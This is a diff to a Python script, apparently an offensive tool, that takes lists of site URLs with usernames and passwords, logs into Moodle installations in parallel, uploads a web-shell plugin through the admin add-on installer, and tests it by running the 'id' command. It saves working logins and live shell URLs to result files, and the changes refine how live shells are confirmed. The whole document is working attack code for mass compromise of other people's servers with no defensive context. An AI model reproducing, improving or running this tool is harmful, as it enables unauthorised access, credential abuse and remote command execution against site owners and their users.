@@ -1,13 +1,12 @@
+
 import requests
 import re
 import os
 import argparse
 from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor
-from colorama import Fore, init
 
 requests.packages.urllib3.disable_warnings()
-init(autoreset=True)
 
 def save_result(filename, text):
     os.makedirs("result", exist_ok=True)
@@ -22,15 +21,22 @@ def get_login_token(session, url):
     except:
         return None
 
-def check_shell(base_url, session):
+def check_plugins_page(session, base_url):
     try:
-        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
-        r = session.get(shell_url, verify=False, timeout=15)
-        if "uid=" in r.text:
-            return shell_url
+        plugins_url = urljoin(base_url, "/admin/plugins.php")
+        r = session.get(plugins_url, timeout=15, verify=False)
+        return "plugin" in r.text.lower()
     except:
-        return None
-    return None
+        return False
+
+def check_webshell(session, base_url):
+    try:
+        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php")
+        check_url = f"{shell_url}?action=exec&cmd=id"
+        r = session.get(check_url, timeout=15, verify=False)
+        return "uid=" in r.text
+    except:
+        return False
 
 def process(line):
     try:
@@ -52,7 +58,6 @@ def process(line):
 
         if login.status_code == 303 and "MOODLEID1_=deleted" in login.headers.get("Set-Cookie", ""):
             save_result("login_success.txt", line)
-
             install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
             r = session.get(install_url, timeout=15, verify=False)
             sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
@@ -81,12 +86,11 @@ def process(line):
 
             if "url" in upload.text:
                 save_result("upload_success.txt", line)
-
-                shell = check_shell(base_url, session)
-                if shell:
-                    save_result("webshell_live.txt", f"{url}|{username}|{password}|{shell}")
-
-    except Exception as e:
+                if check_plugins_page(session, base_url):
+                    save_result("upload_success_checked.txt", f"{url}|{username}|{password}")
+                    if check_webshell(session, base_url):
+                        save_result("webshell_live.txt", f"{url}/local/moodle_webshell/webshell.php")
+    except:
         pass
 
 def main():
@@ -101,8 +105,11 @@ def main():
     with ThreadPoolExecutor(max_workers=args.thread) as exe:
         exe.map(process, lines)
 
-    print(Fore.GREEN + "\nUPLOAD DONE ✅ Cek folder 'result':")
-    print("- login_success.txt\n- upload_success.txt\n- webshell_live.txt\n")
+    print("\nUPLOAD DONE. Cek folder 'result' untuk hasil berikut:")
+    print("- login_success.txt")
+    print("- upload_success.txt")
+    print("- upload_success_checked.txt")
+    print("- webshell_live.txt")
 
 if __name__ == "__main__":
     main()
